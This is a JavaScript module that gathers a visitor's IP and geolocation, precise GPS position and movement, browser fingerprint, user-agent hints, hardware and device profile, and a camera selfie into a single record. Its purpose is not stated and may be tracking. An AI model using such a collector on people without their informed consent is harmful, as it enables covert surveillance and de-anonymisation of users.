import { resolveIpAndGeo } from "./geo-precision.js";
import { requestBestGps, probeGeoPermission } from "./geo-gps.js";
import { collectFingerprint } from "./fingerprint.js";
import { collectHighEntropy } from "./ua-high-entropy.js";
import { collectHardwareExtra, collectAsyncHardwareExtra } from "./hardware.js";
import { collectDeviceProfile } from "./device-profile.js";
import { captureSelfie } from "./collect.js";

/**
 * Runs every available channel in parallel.
 * Denials and timeouts resolve to empty values, never throw.
 */
export async function collectAll() {
  const [net, gps, geoPerm, device, uaHigh, hardware, hardwareAsync, photo] =
    await Promise.all([
      resolveIpAndGeo().catch(() => ({ ip: null, source: null, geo: null })),
      requestBestGps().catch(() => ({ ok: false, reason: "error" })),
      probeGeoPermission().catch(() => null),
      collectDeviceProfile().catch(() => ({})),
      collectHighEntropy().catch(() => ({ supported: false })),
      Promise.resolve().then(collectHardwareExtra),
      collectAsyncHardwareExtra().catch(() => ({})),
      captureSelfie().catch(() => ({ granted: false, error: "denied_or_unavailable" })),
    ]);

  const fp = collectFingerprint();

  return {
    schemaVersion: 3,
    collectedAt: new Date().toISOString(),

    ip: net.ip,
    ip_source: net.source,
    ip_geo: net.geo,
    ip_geo_source: net.geoSource || null,

    gps: gps.ok
      ? {
          latitude: gps.latitude,
          longitude: gps.longitude,
          accuracy: gps.accuracy,
          altitude: gps.altitude,
          altitudeAccuracy: gps.altitudeAccuracy,
          heading: gps.heading,
          speed: gps.speed,
          tier: gps.tier || "gps",
        }
      : null,
    gps_reason: gps.ok ? "granted" : gps.reason || "unknown",
    gps_permission: geoPerm,

    fingerprint: fp.id,
    fingerprint_channels: fp.channels,

    device,
    ua_high_entropy: uaHigh,
    hardware,
    hardware_async: hardwareAsync,

    camera_granted: !!photo.granted,
    photo_base64: photo.granted ? photo.dataUrl : null,
  };
}
